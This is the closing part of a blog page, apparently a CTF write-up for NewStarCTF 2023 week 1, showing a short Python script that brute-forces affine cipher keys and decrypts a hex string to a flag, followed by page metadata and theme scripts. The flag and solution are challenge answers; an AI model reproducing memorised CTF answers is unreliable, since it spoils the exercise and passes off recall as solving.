+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;dd&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;43&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;88&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;ee&#x27;</span>,<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">print</span>(a,b)<br><br>a=<span class="hljs-string">&#x27;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">241</span>*(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">23</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#17 23</span><br><span class="hljs-comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Write-Up/">#Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NewStarCTF 2023 week1 wp</div>
+      <div>http://example.com/2023/10/04/NewStarCTF 2023 week1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/19/$%7B%7D%E4%B8%8Epreg_replace_e%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%5BBJDCTF2020%5DZJCTF/" title="${}与preg_replace_e模式命令执行--[BJDCTF2020]ZJCTF">
+                        <span class="hidden-mobile">${}与preg_replace_e模式命令执行--[BJDCTF2020]ZJCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
